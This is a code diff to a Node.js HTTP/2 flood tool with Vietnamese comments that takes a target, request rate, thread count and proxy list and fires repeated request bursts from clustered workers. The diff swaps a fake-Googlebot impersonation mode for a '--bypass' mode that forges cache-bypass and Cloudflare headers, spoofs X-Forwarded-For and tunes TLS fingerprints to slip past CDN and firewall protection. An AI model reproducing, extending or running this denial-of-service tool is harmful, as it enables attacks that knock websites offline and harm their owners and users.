@@ -18,55 +18,6 @@ if (process.argv.length < 7) {
 const cplist = ['TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256'];
 const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
 const ecdhCurve = ["GREASE:x25519:secp256r1:secp384r1", "x25519"];
-function getRandomGooglebotUserAgent() {
-    // Các phiên bản Googlebot chính thức
-    const googlebotVersions = [
-        "Googlebot/2.1",
-        "Googlebot-Mobile/2.1",
-        "Googlebot-Smartphone/2.1",
-        "Googlebot-Image/1.0",
-        "Googlebot-Video/1.0",
-        "Googlebot-News/2.1",
-        "Googlebot-Ads/2.1"
-    ];
-
-    // Các phiên bản trình duyệt Chrome giả lập
-    const chromeVersions = [
-        "Chrome/90.0.4430.93",
-        "Chrome/91.0.4472.124",
-        "Chrome/92.0.4515.159",
-        "Chrome/93.0.4577.82",
-        "Chrome/94.0.4606.61"
-    ];
-
-    // Các nền tảng giả lập (có thể thay đổi cho phù hợp với thiết bị hoặc trình duyệt khác)
-    const platforms = [
-        "Windows NT 10.0; Win64; x64",        // Windows 10
-        "Linux; Android 10; Google Pixel 4",     // Android
-        "Macintosh; Intel Mac OS X 10_15_7",   // macOS
-        "iPhone; CPU iPhone OS 14_2 like Mac OS X", // iOS
-        "Linux; Ubuntu 18.04; x86_64"         // Linux
-    ];
-
-    // Chọn ngẫu nhiên phiên bản Googlebot
-    const randomGooglebotVersion = googlebotVersions[Math.floor(Math.random() * googlebotVersions.length)];
-
-    // Chọn ngẫu nhiên phiên bản Chrome
-    const randomChromeVersion = chromeVersions[Math.floor(Math.random() * chromeVersions.length)];
-
-    // Chọn ngẫu nhiên nền tảng
-    const randomPlatform = platforms[Math.floor(Math.random() * platforms.length)];
-
-    // Tạo User-Agent hoàn chỉnh, giả lập một yêu cầu từ Googlebot
-    const userAgent = `Mozilla/5.0 (${randomPlatform}) AppleWebKit/537.36 (KHTML, like Gecko) ${randomChromeVersion} Mobile Safari/537.36 (compatible; ${randomGooglebotVersion}; +http://www.google.com/bot.html)`;
-
-    return userAgent;
-}
-
-// Lấy User-Agent Googlebot ngẫu nhiên
-const randomUserAgent = getRandomGooglebotUserAgent();
-
-
 
 const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_SINGLE_ECDH_USE | crypto.constants.SSL_OP_SINGLE_DH_USE | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_TICKET;
 const secureProtocol = "TLS_method";
@@ -89,7 +40,7 @@ const args = {
     icecool: process.argv.includes('--icecool'), // icecool optimaze ram, cpu
     dual: process.argv.includes('--dual'), // dualhyper
     brave: process.argv.includes('--brave'),
-    google: process.argv.includes('--google'),
+    bypass: process.argv.includes('--bypass'),
     close: process.argv.includes('--close')
 };
 
@@ -115,7 +66,7 @@ if (cluster.isMaster) {
     console.log(`thread: ${process.argv[5]}`);
     console.log(`proxyfile: ${process.argv[6]}`);
     console.log(`heap size: ${(v8.getHeapStatistics().heap_size_limit / (1024 * 1024)).toFixed(2)}`);
-    console.log(`icecool: ${args.icecool}, dual: ${args.dual}, brave: ${args.brave}, fakegooglebot: ${args.google}`);
+    console.log(`icecool: ${args.icecool}, dual: ${args.dual}, brave: ${args.brave}, bypass: ${args.google}`);
     console.log(`Number of CPU cores: ${numCPUs}`);
 
     // Fork worker cho mỗi core có sẵn trên hệ thống
@@ -281,7 +232,7 @@ function runFlooder() {
         "upgrade-insecure-requests": "1",
         "Origin": `https://${parsedTarget.host}`,
         "Referer": `https://${Ref}`,
-        ...braveHeaders
+        
     };
 
     const proxyOptions = {
@@ -343,30 +294,31 @@ function runFlooder() {
             if (Math.random() < 0.2) headersbex['Referer'] = 'https://www.google.com/';
             if (Math.random() < 0.1) headersbex['Origin'] = 'https://www.google.com/';
         }        
-                if (args.google) {
-            tlsOptions.ALPNProtocols = ['h2'];
-tlsOptions.maxVersion = 'TLSv1.3';
-tlsOptions.minVersion = 'TLSv1.2';
-tlsOptions.ciphers = randomElement(cplist);
-tlsOptions.dhparam = 'modp4096';
-headersbex['User-Agent'] = getRandomGooglebotUserAgent();
-headersbex["sec-ch-ua"] = `"Google Chrome"; v="94", "Not A Brand"; v="99", "Chromium"; v="94"`;
-headersbex['DNT'] = '1';  // Do Not Track
-headersbex['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8';
-headersbex['Accept-Encoding'] = 'gzip, deflate, br';  // Hỗ trợ nén nội dung
-headersbex['Accept-Language'] = "en-US,en;q=0.9,vi;q=0.8";
-headersbex['From'] = 'googlebot(at)googlebot.com';
-headersbex['Permissions-Policy'] = 'geolocation=(), microphone=(), camera=()';  // Chặn các tính năng cho quyền riêng tư
-headersbex['Pragma'] = 'no-cache';  // Đảm bảo không lưu trữ bộ đệm
-headersbex['Sec-Fetch-Site'] = 'same-origin';  // Yêu cầu từ cùng một nguồn
-headersbex['Sec-Fetch-Mode'] = 'navigate';  // Chế độ điều hướng
-headersbex['Sec-Fetch-Dest'] = 'document';  // Đích đến là tài liệu
-headersbex['X-Content-Type-Options'] = 'nosniff';
-
-// Các tiêu đề có thể được thêm ngẫu nhiên để mô phỏng hành vi người dùng thực tế
-if (Math.random() < 0.3) headersbex['X-Requested-With'] = 'XMLHttpRequest';
-if (Math.random() < 0.9) headersbex['Referer'] = 'https://www.google.com/';
-if (Math.random() < 0.1) headersbex['Origin'] = 'https://www.google.com/';
+                if (args.bypass) {
+            tlsOptions.maxVersion = 'TLSv1.3';
+            tlsOptions.minVersion = 'TLSv1.2';
+            tlsOptions.ciphers = randomElement(cplist);
+            headersbex['User-Agent'] = finalUa,
+            headersbex["sec-ch-ua"] = '"Google Chrome";v="116", "Chromium";v="116", "Not)A;Brand";v="99"';
+            headersbex['DNT'] = '1';  // Do Not Track
+            headersbex['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8';
+            headersbex['Accept-Encoding'] = 'gzip, deflate, br';
+            headersbex['Accept-Language'] = "en-US,en;q=0.9,vi;q=0.8";
+            headersbex['Pragma'] = 'no-cache';  // Đảm bảo không lưu trữ bộ đệm
+            headersbex['Cache-Control'] = 'no-cache';  // Không lưu trữ bộ đệm
+            headersbex['Upgrade-Insecure-Requests'] = '1';  // Cập nhật các yêu cầu không an toàn
+            headersbex['Sec-Fetch-Site'] = 'same-origin';  // Yêu cầu từ cùng một nguồn
+            headersbex['Sec-Fetch-Mode'] = 'navigate';  // Chế độ điều hướng
+            headersbex['Sec-Fetch-Dest'] = 'document';  // Đích đến là tài liệu
+            headersbex['TE'] = 'Trailers';  // Tiếp nhận trailers trong HTTP/2
+            headersbex['Access-Control-Allow-Headers'] = 'Content-Type, Authorization';
+            headersbex['Access-Control-Allow-Credentials'] = 'false';
+            headersbex['X-Cache'] = 'BYPASS';
+            headersbex['CF-Cache-Status'] = 'BYPASS';
+            if (Math.random() < 0.3) headersbex['X-Requested-With'] = 'XMLHttpRequest'; 
+            if (Math.random() < 0.9) headersbex['Referer'] = 'https://www.google.com/'; 
+            if (Math.random() < 0.1) headersbex['Origin'] = 'https://www.google.com/';
+            headersbex['X-Forwarded-For'] = parsedAddr[0]; 
 
         }        
 
@@ -396,9 +348,10 @@ const IntervalAttack = setInterval(() => {
     for (let i = 0; i < requestRate; i++) {
         const bex = bexClient.request(headersbex)
             .on('response', (response) => {
-                // Kiểm tra mã phản hồi
                 if (response.statusCode === 403 && args.close ) {
-                    bexClient.destroy();  
+                    bex.close();
+                    bex.destroy();
+                    bexClient.destroy();
                     connection.destroy(); 
                 }
                     bex.close();
